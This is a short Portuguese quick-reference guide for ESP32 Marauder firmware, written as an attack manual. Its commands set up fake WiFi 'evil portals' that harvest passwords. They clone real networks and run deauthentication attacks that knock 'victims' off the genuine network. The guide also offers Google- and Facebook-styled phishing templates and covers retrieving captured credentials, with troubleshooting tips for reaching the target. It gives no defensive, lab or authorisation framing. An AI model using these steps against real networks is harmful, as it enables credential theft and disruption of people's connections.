# Guia Rápido - ESP32 Marauder

## Conectar

1. Plugar ESP32 no USB
2. Rodar: `pio device monitor`
3. Digitar comandos no terminal

---

## Evil Portal Simples

Criar rede WiFi falsa que captura senhas:

```
evilportal start "Free WiFi"
```

Conectar celular na rede "Free WiFi" → página de login aparece → vítima digita senha

Ver senhas capturadas:
```
evilportal creds
```

Parar:
```
evilportal stop
```

---

## Evil Portal + Deauth (mais efetivo)

Clona uma rede real e desconecta as pessoas dela:

```
scanap                    # procura redes
listap                    # mostra lista
select 0                  # escolhe a rede (trocar 0 pelo número)
evilportal start          # cria clone
deauth                    # desconecta vítimas da rede real
```

Ver senhas:
```
evilportal creds
```

Parar tudo:
```
stopscan
evilportal stop
```

---

## Trocar visual da página

```
evilportal template portal_google.html
```

Opções:
- `index.html` - genérico
- `portal_google.html` - estilo Google
- `portal_facebook.html` - estilo Facebook

---

## Todos os comandos

**Scan:**
- `scanap` - procura redes
- `listap` - lista redes
- `select N` - seleciona rede N

**Ataque:**
- `deauth` - desconecta vítimas
- `stopscan` - para deauth

**Portal:**
- `evilportal start "nome"` - cria rede falsa
- `evilportal stop` - para
- `evilportal creds` - mostra senhas
- `evilportal status` - status atual
- `evilportal clear` - apaga senhas

**Sistema:**
- `help` - ajuda
- `reboot` - reinicia

---

## Se der problema

- Portal não aparece → desliga dados móveis do celular
- Deauth não funciona → chega mais perto do alvo
- Travou → despluga e pluga USB de novo
